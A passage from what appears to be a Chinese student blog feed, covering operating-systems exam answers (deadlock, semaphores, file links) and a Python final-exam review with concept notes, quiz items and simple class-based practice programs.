<li>进程推进顺序不当引起死锁<br>由于进程在运行中具有异步性特征，这可能使P1和P2两个进程按下述两种顺序向前推进。<br>1） 进程推进顺序合法<br>当进程P1和P2并发执行时，如果按照下述顺序推进：P1：Request（R1）； P1：Request（R2）； P1: Relese（R1）；P1: Relese（R2）； P2：Request（R2）； P2：Request（R1）； P2: Relese（R2）；P2: Relese（R1）；这两个进程便可顺利完成，这种不会引起进程死锁的推进顺序是合法的。<br>2） 进程推进顺序非法<br>若P1保持了资源R1,P2保持了资源R2，系统处于不安全状态，因为这两个进程再向前推进，便可能发生死锁。例如，当P1运行到P1：Request（R2）时，将因R2已被P2占用而阻塞；当P2运行到P2：Request（R1）时，也将因R1已被P1占用而阻塞，于是发生进程死锁。<br>答案：CPU，选C</li>
</ul>
<ol start="23">
<li><p>程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识（）<br>解析：<br>设备管理具有设备独立性的特点，操作系统以系统调用方式来请求某类设备时，使用的是逻辑设备名。而在程序实际执行时，将逻辑设备名转换为对应的物理设备名。<br>答案：逻辑设备名，选D</p>
</li>
<li><p>分段存储管理系统中，地址长度为32位，其中段号占8位，则段长最大（）<br>解析：<br>分段存储管理中，逻辑地址分为两部分，段号和段内位移，地址总长度为32位．段号占了8位，则剩下24位表示段内位移的，则最大段长为2^24字节。<br>答案：2^24字节，选C</p>
</li>
<li><p>设与某资源相关联的信号量初值为3，当前值为1，若M表示该资源的可用个数，N表示等待资源的进程数，则M，N分别是（）<br>解析：<br>信号量的初值表示系统中某类资源的数目，已知为3；<br>信号量的值小于等于0时，表示该类资源已分配完毕，此时信号量的绝对值表示在该信号量链表中已阻塞进程的数目。<br>信号量的值大于0时，表示该类资源还没有完全分配完，此时信号量的值表示该资源的可用个数。<br>信号量的当前值为1，大于0，则M表示该资源的可用个数为1，N表示等待资源的进程数为0。<br>答案：1，0  选A</p>
</li>
<li><p>某计算机系统中有8台打印机，有K个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的K的最小值（）<br>解析：<br>由于每个进程最多需要3台打印机，总共有8台打印机。<br>当有3个进程竞争使用时，每个进程能分配打印机数分别为3，3，2。有进程能释放资源，不会发生死锁。<br>当有4个进程竞争使用时，每个进程能分配2台打印机，不足以释放资源，即发生死锁。<br>因此最小值为4。<br>总结：用系统资源n-1除以进程最多需要的资源数m-1得到的结果向下取整的结果为不发生死锁的最大进程数。<br>答案：4，选C</p>
</li>
<li><p>设文件F1当前引用计数值为1，先建立F1的符号链接文件F2，再建立F1的硬链接文件F3，然后删除F1。此时F2和F3的引用计数值分别是（）<br>解析：<br>硬链接，同时改变源文件和链接文件连接数（+1），其实是同一个文件，文件类型是普通文件。<br>软链接，也叫符号链接，创建新的链接文件，文件类型，链接文件（l），是一个全新的文件，相当于快捷方式，不改变源文件链接数。<br>答案：1，1。选C</p>
</li>
<li><p>当进程因时间片用完而让出处理机时，该进程应转变为（）状态。<br>解析：<br><strong>进程调度的时机</strong><br>进程调度发生的时机（也称为调度点）与进程的状态变化有直接的关系。回顾进程状态变化图，我们可以看到进程调度的时机直接与进程在运行态&lt;--&gt;退出态&#x2F;就绪态&#x2F;阻塞态的转变时机相关。简而言之，引起进程调度的时机可归结为以下几类：</p>
</li>
</ol>
<ul>
<li>正在执行的进程执行完毕，需要选择新的就绪进程执行。</li>
<li>正在执行的进程调用相关系统调用（包括与I/O操作，同步互斥操作等相关的系统调用）导致需等待某事件发生或等待资源可用，从而将白己阻塞起来进入阻塞状态。</li>
<li>正在执行的进程主动调用放弃CPU的系统调用，导致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
<li>等待事件发生或资源可用的进程等待队列，从而导致进程从阻塞态回到就绪态，并可参与到调度中。</li>
<li>正在执行的进程的时间片已经用完，致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
<li>在执行完系统调用后准备返回用户进程前的时刻，可调度选择一新用户进程执行</li>
<li>就绪队列中某进程的优先级变得高于当前执行进程的优先级，从而也将引发进程调度。</li>
<li>有序列表内容<br>答案：就绪，选B</li>
</ul>
<ol start="29">
<li><p>文件的保密是指防止文件被（）<br>解析：<br>文件的保护:防止文件被破坏。<br>文件的保密:防止文件被窃取。<br>答案：窃取，选C</p>
</li>
<li><p>为了允许不同用户的文件具有相通的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
</li>
</ol>
]]></content>
      <categories>
        <category>OS</category>
        <category>习题</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Python期末专题</title>
    <url>/2022/11/13/Python%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当撰写这篇Python复习专题的时候，距离期末考试仅剩3天。<br>我啊，真是堕落。&#x2F;(ㄒoㄒ)&#x2F;~~<br>本篇复习主要以两次测试以及题库为主，其它作为补充。</p>
<span id="more"></span>

<h1 id="概念题"><a href="#概念题" class="headerlink" title="概念题"></a>概念题</h1><ol>
<li>id()函数</li>
</ol>
<ul>
<li>定义和用法<br>id() 函数返回指定对象的唯一 id。<br>Python 中的所有对象都有其自己的唯一 id。<br>id 在创建时已分配给对象。<br>id 是对象的内存地址，并且在每次运行程序时都不同。（除了某些具有恒定唯一 id 的对象，比如 -5 到 256 之间的整数</li>
<li>语法<br>id(object)</li>
</ul>
<ol start="2">
<li><p>Python是一种<strong>跨平台</strong>的，是一个高层次的结合了<strong>解释性</strong>、<strong>编译性</strong>、<strong>互动性</strong>和<strong>面向对象</strong>的<strong>脚本</strong>语言</p>
</li>
<li><p>python序列</p>
</li>
</ol>
<ul>
<li>有序序列包括： <strong>列表 元组 字符串</strong></li>
<li>无序序列包括： <strong>字典 集合 控制集合数据的对象</strong></li>
</ul>
<ol start="4">
<li><p>python程序的扩展名<br>.py是<strong>源文件扩展名</strong><br>.pyw是另一种<strong>源文件扩展名</strong>  主要用于GUI程序发布时不需要看到控制台信息的情况<br>.pyc是<strong>源文件编译后的文件</strong><br>.pyo是<strong>源文件优化编译后的文件</strong><br>.pyd是<strong>其他语言写的python库</strong></p>
</li>
<li><p>Python注释</p>
</li>
</ol>
<ul>
<li>单行注释 #</li>
<li>多行注释(不一定是注释，有时可作为字符串存在)<br>单引号 <code>&#39;&#39;&#39;</code><br>双引号 <code>&quot;&quot;&quot;</code></li>
</ul>
<ol start="6">
<li><p>Python 变量名区分大小写<br>例如：Cuit和cuit是两个变量名</p>
</li>
<li><p>非面向对象的程序设计语言是<br>C语言  汇编语言</p>
</li>
<li><p>使用上下文管理关键字<strong>with</strong>可以自动管理文件对象，不论何种原因结束该关键字中的语句块，都能保证文件被正确关闭</p>
</li>
<li><p>Python3 中有六个标准的数据类型：</p>
</li>
</ol>
<ul>
<li>Number（数字）  支持 int、float、bool、complex（复数）</li>
<li>String（字符串）</li>
<li>List（列表）</li>
<li>Tuple（元组）</li>
<li>Set（集合）</li>
<li>Dictionary（字典）</li>
</ul>
<ol start="10">
<li><p>Python中的关系运算符可以连续使用<br>如：6&lt; a &lt;10</p>
</li>
<li><p>Python 3.x 中可以使用中文作为变量名</p>
</li>
<li><p>生成器推导式比列表推导式具有更高的效率，推荐使用</p>
</li>
<li><p>Python编程中，提示符“&gt;&gt;&gt;”表示 交互式编程模式</p>
</li>
<li><p>Python不允许使用<strong>关键字</strong>作为变量名，允许使用<strong>内置函数名</strong>作为变量名，但这会改变函数名的定义</p>
</li>
<li><p>Python中相同的值在内存中的保存</p>
</li>
</ol>
<ul>
<li>对于[-5, 256]之间的整数，会在内存中进行缓存，任何时刻在内存中只有一份</li>
<li>同一个列表或元组中的大整数在内存中会保存一份</li>
<li>对于实数，不进行缓存。一样的实数，在内存中也不是一份</li>
<li>对于字符串，是否进行缓存，并不是单纯地看长度</li>
</ul>
<ol start="16">
<li><p>对于带有else子句的for循环和while循环，当循环因循环条件不成立而自然结束时会执行else中的代码</p>
</li>
<li><p>通过对象可以调用<strong>类方法</strong>和<strong>静态方法</strong></p>
</li>
<li><p>Python使用<strong>class</strong>关键字来定义类</p>
</li>
<li><p>在函数内部可以通过关键字<strong>global</strong>来定义全局变量</p>
</li>
<li><p>Python中，关于类中的构造函数 创建时自动调用</p>
</li>
<li><p>Python 函数返回值</p>
</li>
</ol>
<ul>
<li>函数体中 return 语句有指定返回值时返回的就是其值</li>
<li>函数体中没有 return 语句时，函数运行结束会隐含返回一个 None 作为返回值，类型是 NoneType，与 return 、return None 等效，都是返回 None</li>
</ul>
<ol start="22">
<li><p>在类的定义中，以两个下划线“__”开始（不以两个或者更多下划线结尾）定义的成员方法是<strong>私有</strong>方法</p>
</li>
<li><p>在Python中定义类时所有实例方法的第一个参数用来表示对象本身，在类的外部通过对象名来调用实例方法时不需要为该参数传值</p>
</li>
<li><p>通过类名修改类属性的值，会影响所有的实例化对象</p>
</li>
<li><p>自定义函数时，即使该函数不需要接收任何参数，也必须在函数名后保留一对空的圆括号来表示这是一个函数</p>
</li>
<li><p>Python 数据成员(属性)</p>
</li>
</ol>
<ul>
<li>属于对象的数据成员一般在构造方法__init__()中定义，当然也可以在其他成员方法中定义，在定义和在实例方法中访问数据成员时<strong>以self作为前缀</strong>，同一个类的不同对象（实例）的数据成员之间互不影响</li>
<li>属于类的数据成员是该类所有对象共享的，不属于任何一个对象，在定义类时这类数据成员一般不在任何一个成员方法的定义中</li>
</ul>
<ol start="27">
<li>Python函数的参数</li>
</ol>
<ul>
<li>位置参数(positional argument)<br>位置参数也称必须参数，位置参数须以从左到右的顺序传入函数。调用时的数量必须和声明时的一样</li>
<li>关键字参数(keyword argument)<br>在调用函数时，实参可以是key&#x3D;value的形式，称为关键字参数<br>可以不按照从左到右的顺序定义，但仍能为指定的形参赋值<br>关键字参数在位置参数后面。位置参数是必须先满足，才考虑其他可变参数<br>不可以对一个形参重复赋值</li>
<li>默认参数<br>默认参数必须在位置参数之后</li>
<li>不定长参数<br>当需要一个函数能处理比当初声明时更多的参数，则这些参数叫做不定长参数</li>
</ul>
<ol start="28">
<li><p>以读模式打开文件时，文件指针指向文件开始处</p>
</li>
<li><p>函数内部定义的局部变量当函数调用结束后被自动删除</p>
</li>
<li><p>语句<strong>pass</strong>仅起到占位符的作用，并不会做任何操作</p>
</li>
<li><p>Python支持在函数内部定义函数，此类函数又称为<strong>局部</strong>函数</p>
</li>
<li><p>python中的*(星号)</p>
</li>
</ol>
<ul>
<li>作为乘法运算符</li>
<li>收集列表中多余的值</li>
<li>函数中收集参数或者分配参数</li>
</ul>
<ol start="33">
<li><p>对文件进行读写操作之后必须显式关闭文件以确保所有内容都得到保存</p>
</li>
<li><p>python编程语言中，函数可以不包含 return 语句</p>
</li>
<li><p>在类中，采用@和关键字<strong>classmethod</strong>修饰的方法为类方法</p>
</li>
<li><p>Python内置函数<strong>open</strong>用来打开或创建文件并返回文件对象</p>
</li>
<li><p>类的数据成员，一种是<strong>类属性</strong>，另一种是<strong>实例</strong>属性</p>
</li>
<li><p>Python类方法和实例方法相似，它最少也要包含一个参数，只不过类方法中通常将其命名为<strong>cls</strong></p>
</li>
<li><p>Python 支持多继承，如果父类中有相同的方法名，而在子类中调用时没有指定父类名，则 Python 解释器将从左向右按顺序进行搜索</p>
</li>
<li><p>使用 pickle 进行序列化得到的二进制文件使用 struct <strong>不可以</strong>正确地进行反序列化</p>
</li>
<li><p>Python文件基本操作方法</p>
</li>
</ol>
<ul>
<li>open()  read()  write()  close()</li>
<li>readline() 一次读取一行</li>
<li>append()<strong>不是！</strong></li>
<li>详细：<a href="https://www.w3cschool.cn/article/25704283.html">Python文件基本操作整理</a></li>
</ul>
<ol start="42">
<li>Python文件打开的合法模式组合</li>
</ol>
<ul>
<li>r&#x2F;rt  默认模式，文本模式读</li>
<li>rb	二进制文件</li>
<li>w&#x2F;wt 	文本模式写，打开前文件存储被清空</li>
<li>wb    二进制写，文件存储同样被清空</li>
<li>a   	追加模式，只能写在文件末尾</li>
<li>a+  	可读写模式，写只能写在文件末尾</li>
<li>w+ 	可读写，与a+的区别是要清空文件内容</li>
<li>r+   	可读写，与a+的区别是可以写到文件任何位置</li>
</ul>
<ol start="43">
<li>Python成员方法</li>
</ol>
<ul>
<li>公有方法  默认都是公有的方法</li>
<li>私有方法  以两个下划线”__“开始声明私有方法</li>
<li>静态方法  使用staticmethod()方法声明静态方法</li>
<li>类方法    使用classmethod()方法声明类方法</li>
</ul>
<ol start="44">
<li><p>Python编程语言中，可以动态地为类和对象增加成员</p>
</li>
<li><p>为了提高Python代码运行速度和进行适当的保密，可以将Python程序文件编译为扩展名<strong>pyc</strong>的文件</p>
</li>
<li><p>可以使用内置函数**globals()**查看包含当前作用域内所有全局变量和值的字典</p>
</li>
<li><p>可以使用内置函数**locals()**查看包含当前作用域内所有局部变量和值的字典</p>
</li>
<li><p>字典对象的**get()**方法可以获取指定“键”对应的“值”，并且可以在指定“键”不存在的时候返回指定值，如果不指定则返回 None</p>
</li>
<li><p>字典对象的**items()**方法返回字典中的“键-值对”列表</p>
</li>
<li><p>Python 标准库 random 中的**choice()**方法作用是从序列中随机选择1个元素</p>
</li>
<li><p>Python 标准库 random 中的sample(seq, k)方法作用是从序列中选择<strong>不重复</strong>的k个元素</p>
</li>
<li><p>random模块中**shuffle()**方法的作用是将列表中的元素随机乱序</p>
</li>
<li><p>在设计正则表达式时，字符**?**紧随任何其他限定符(*、+、?、{n}、{n,}、{n,m})之后时，匹配模式是“非贪心的”，匹配搜索到的、尽可能短的字符串</p>
</li>
<li><p>在Python定义类时，与运算符“**”对应的特殊方法名为:</p>
</li>
</ol>
<p><code>__pow__()</code></p>
<ol start="55">
<li>在Python中定义类时，与运算符“&#x2F;&#x2F;”对应的特殊方法名为:</li>
</ol>
<p><code>__floordiv__()</code></p>
<ol start="56">
<li>在Python中，不论类的名字是什么，构造方法的名字都是:</li>
</ol>
<p><code>__init__()</code></p>
<ol start="57">
<li><p>如果在设计一个类时实现了__contains__()方法，那么该类的对象会自动支持<strong>in</strong>运算符</p>
</li>
<li><p>对文件进行写入操作之后，**flush()**方法用来在不关闭文件对象的情况下将缓冲区内容写入文件</p>
</li>
<li><p>Python标准库os中用来列出指定文件夹中的文件和子文件夹列表的方式是<strong>listdir()</strong></p>
</li>
<li><p>Python标准库<strong>hashlib</strong>中提供了计算MD5摘要的方法md5()</p>
</li>
</ol>
<h1 id="选填判断题"><a href="#选填判断题" class="headerlink" title="选填判断题"></a>选填判断题</h1><ol>
<li><p><code>x = &#123;1:1, 2:2&#125;</code>，之后执行<code>x.update(&#123;2:3, 3:3&#125;)</code>，则<code>sorted(x.items())</code>值为：<br>[(1, 1), (2, 3), (3, 3)]<br>解析：<br>执行update函数后，x&#x3D;{1: 1, 2: 3, 3: 3}<br>由于items()方法返回一个 view 对象。这个视图对象包含字典的键值对，形式为列表中的元组。<br>因此可得到该结果。</p>
</li>
<li><p>判断：正则表达式’^abc’只能匹配所有以’abc’开头的字符串<br>对</p>
</li>
<li><p>判断：表达式1&lt;2 or a&lt;b的值为异常报错，因为a,b没有被定义<br>错<br>解析：<br>运行后不会产生报错。因为是惰性求值，or语句的前半判断正确，后半则不会运算</p>
</li>
<li><p>在Python编程语言中，已知i&#x3D;4，++i的值为：<br>4<br>解析：<br>++i 表示先输出再作 + 运算</p>
</li>
<li><p>int(‘101’, 2)的值是：<br>5<br>解析：<br>int()的语法 <code>class int(x, base=10)</code><br>参数：x -- 字符串或数字  base -- 进制数，默认十进制<br>该题是将前面的字符串’101’当作二进制，转换成十进制即为5</p>
</li>
<li><p><code>x = [&#39;321&#39;, &#39;0234&#39;, &#39;9&#39;,&#39;99&#39;],max(x, key=len)</code>结果是：<br>‘0234’<br>解析：<br>max()函数是从中选出最大值，key&#x3D;len意思是按长度排序，因此结果’0234’</p>
</li>
<li><p>判断：已知 x &#x3D; ‘cuit’，那么赋值语句 x &#x3D; 3 由于赋值类型不一致，导致该语句是无法正常执行的<br>错<br>解析：<br>可以正常执行，能够赋值成功</p>
</li>
<li><p>已知<code>x = [[None] * 2] * 2</code>,那么<code>x[0][0]=1</code>后，x的值为：<br>[[1, None], [1, None]]<br>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=[[None] * 2] </span><br></pre></td></tr></table></figure>
<p>值为[[None, None]]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x = [[None] * 2] * 2 </span><br></pre></td></tr></table></figure>
<p>值为[[None, None], [None, None]]<br>外面的 * 2 是完全复制，内存id相同，因此赋值时<code>x[0][0],x[1][0]</code>均为1<br>内部的 * 2 是部分复制，内存id不同，因此赋值时<code>x[0][1],x[1][1]</code>仍然是None</p>
</li>
<li><p>表达式’a,,,bb,,ccc’.split(‘,’)的运行结果是：<br>[‘a’, ‘’, ‘’, ‘bb’, ‘’, ‘ccc’]<br>解析：<br>按照’,’切分字符串，由于该字符串两个’,’之间为空，所以最终会得到’’的字符串</p>
</li>
<li><p>已知 x 为非空字符串，那么表达式 <code>&#39;,&#39;.join(x.split(&#39;,&#39;)) == x</code> 的值一定为 True<br>对</p>
</li>
<li><p>语句<code>x.append(3)</code>和<code>x = x+[3]</code>，都是原地修改列表x,在列表x尾部添加元素3<br>错<br>解析：<br>append()函数是在列表尾部添加元素3，<code>x = x+[3]</code>是重新创建一个列表，把元素3添加进去，再赋值给x</p>
</li>
<li><p>表达式<code>&#123;1, 2, 3, 4, 5, 6&#125; ^ &#123;5, 6, 7, 8&#125;</code>的值为:<br>{1, 2, 3, 4, 7, 8}<br>解析：<br>集合运算符号’^’是剔除两个集合相同元素后得到新集合。<br>更多集合运算知识：<a href="https://www.runoob.com/python3/python3-set.html">Python3 集合</a></p>
</li>
<li><p>str((1,2,3))的返回值是:<br>‘(1,2,3)’<br>解析：<br>不要忘加外面的引号，单引双引皆可</p>
</li>
<li><p>正则表达式r’p*‘表示允许匹配多个(至少1个)p<br>错<br>解析：<br>*表示匹配前⼀个字符出现0次或者⽆限次，即可有可⽆</p>
</li>
<li><p>对象<code>x=（1,2,3)</code>,语句<code>x[0]=10</code>，表示修改对象x第一个元素的值<br>错<br>解析：<br>元组对象不支持元素修改，因为是不可变类型</p>
</li>
<li><p>表达式 [] &#x3D;&#x3D; None 的值为 True<br>错<br>解析<br>值为False。 None表示空，但它不等于空字符串、空列表，也不等同于False</p>
</li>
<li><p>“aassadfddff”.strip(“af”)的结果是：<br>ssadfdd<br>解析：<br>该正则表达式strip意为将前面字符串首尾包含括号内字符的切掉。<br>如果是lstrip 切掉左边的<br>如果是rstrip 切掉右边的</p>
</li>
<li><p>已知<code>x = [300, 300, 300]，x[0] is x[1]</code>的值为True<br>对<br>解析：<br>is运算符判断两者id是否相同。本题中，同一列表中值相同的元素id相同</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="built_in">input</span>(<span class="string">&#x27;input ten number:&#x27;</span>)<span class="comment">#输入的分别是3 4 2 3 17 4 21 18 19 22</span></span><br><span class="line">a_list = <span class="built_in">list</span>(<span class="built_in">map</span>( <span class="keyword">lambda</span> x:<span class="built_in">int</span>(x),x.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#期望 a_lis为: [3,4,2,3,17,4,21,18,19,22]；注意上一行x中有空格</span></span><br><span class="line"><span class="built_in">print</span>(a_list[-<span class="number">6</span>:-<span class="number">1</span>])<span class="comment">#期望输出[4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>(a_list.remove(<span class="number">3</span>))<span class="comment">#期望输出[4,2,3,17,4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>( <span class="built_in">len</span>(a_list))<span class="comment">#期望显示a___list元素个数</span></span><br></pre></td></tr></table></figure>
<p>解析：<br>输入时是字符串，因此需要用<code>int / lambda x:int(x)</code>转化为整型，用<code>x. split(&#39; &#39;)</code>将输入时间隔的空格去掉<br>采用切片操作[-6:-1],意思是从列表的倒数第6个开始，一直到倒数第1个<br>remove()函数从列表中移除括号内的数字，从左到右第一个会被移除<br>len()输出列表长度</p>
</li>
<li><p>已知函数定义 <code>def func(**p):return &#39;&#39;.join(sorted(p))</code>，那么表达式<code>func(x=1, y=2, z=3)</code>的值是:<br>‘xyz’<br>解析：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;z&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(p)</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   [&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(p))</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    price = <span class="number">1000</span>                     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, c</span>):</span><br><span class="line">        self.color = c                 </span><br><span class="line">car1 = Car(<span class="string">&quot;Red&quot;</span>)                      </span><br><span class="line">car2 = Car(<span class="string">&quot;Blue&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line">Car.price = <span class="number">1100</span>                     </span><br><span class="line">Car.name = <span class="string">&#x27;QQ&#x27;</span>                        </span><br><span class="line">car1.color = <span class="string">&quot;Yellow&quot;</span>                  </span><br><span class="line"><span class="built_in">print</span>(car2.name)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br></pre></td></tr></table></figure>
<p>阅读上面程序，按顺序写出该程序的运行结果:<br><u>Red</u> <u>1000</u> <u>QQ</u> <u>1100</u> <u>Yellow</u></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Test</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">调用该函数Test(<span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>), 输出正确的是：</span><br><span class="line"><span class="comment"># (3,5,8)</span></span><br></pre></td></tr></table></figure>
<p>解析：<br>有多个元素一次性输出，以元组形式输出</p>
</li>
<li><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Sum0</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum1</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>((a,b,c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum2</span>(<span class="params">a, b=<span class="number">3</span>, c=<span class="number">5</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(Sum0(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum1(c=<span class="number">8</span>,a=<span class="number">9</span>,b=<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(a=<span class="number">8</span>, c=<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(<span class="number">8</span>))</span><br><span class="line">demo(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>阅读上面的程序，按顺序写出该程序运行结果<br><u>6</u> <u>[9,10,8]</u> <u>13</u> <u>16</u> <u>(1,2)</u></p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorted([&#x27;bbc&#x27;,&#x27;abc&#x27;,&#x27;bcd&#x27;,&#x27;acd&#x27;], key=lambda x:(x[0],x[2]))</span><br></pre></td></tr></table></figure>
<p>值为：<br>[‘abc’,’acd’,’bbc’,’bcd’]<br>解析：<br>sorted按照字符大小排序</p>
</li>
</ol>
<h1 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h1><p>1.<br><strong>描述</strong><br>牛牛的Python老师为了更好地管理班级，利用一个类Student来管理学生，这个类包含了学生姓名（str）、学号（str）、分数（int）、每次作业等级（list[str]）等信息。请你帮助牛牛的老师实现这样一个类，并定义构造方法实现初始化，定义打印函数实现打印学生的姓名、学号、分数、提交作业的次数、每次作业的等级。<br><strong>输入描述：</strong><br>第一行输入字符串表示学生姓名。<br>第二行输入字符串表示学生学号。<br>第三行输入整数表示学生得分。<br>第四行输入多个大写字母表示每次作业等级，用空格间隔。<br><strong>输出描述：</strong><br>用一句话输出学生的姓名、学号、分数、提交作业的次数、每次作业的等级，可以参考输出样例。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>12345<br>90<br>A B C<br><strong>输出：</strong><br>NiuNiu’s student number is 12345, and his grade is 90. He submitted 3 assignments, each with a grade of A B C<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,stu_num,score,level</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.stu_num = stu_num</span><br><span class="line">        self.score = score</span><br><span class="line">        self.level = level</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>\&#x27;s student number is <span class="subst">&#123;self.stu_num&#125;</span>, and his grade is <span class="subst">&#123;self.score&#125;</span>. He submitted <span class="subst">&#123;<span class="built_in">len</span>(self.level)&#125;</span> assignments, each with a grade of <span class="subst">&#123;<span class="string">&quot; &quot;</span>.join(self.level)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">stu_num = <span class="built_in">input</span>()</span><br><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">level = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line">Stu1 = Student(name,stu_num,score,level)</span><br><span class="line">Stu1.p()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.<br><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的name与salary为该类创建实例e，并调用printclass方法输出信息，如果没有年龄信息则输出错误信息”Error! No age”。<br>根据输入的年龄为实例e直接添加属性age等于输入值，再次调用printclass方法输出信息。（printclass方法中建议使用try…except…结构）<br><strong>输入描述：</strong><br>三行分别输入姓名name、工资salary、年龄age，其中第一个为字符串，后两个为整型数字。<br><strong>输出描述：</strong><br>根据描述输出错误信息或是打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>8000<br>22<br><strong>输出：</strong><br>Error! No age<br>NiuNiu’s salary is 8000, and his age is 22<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">e = Employee(name,salary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span 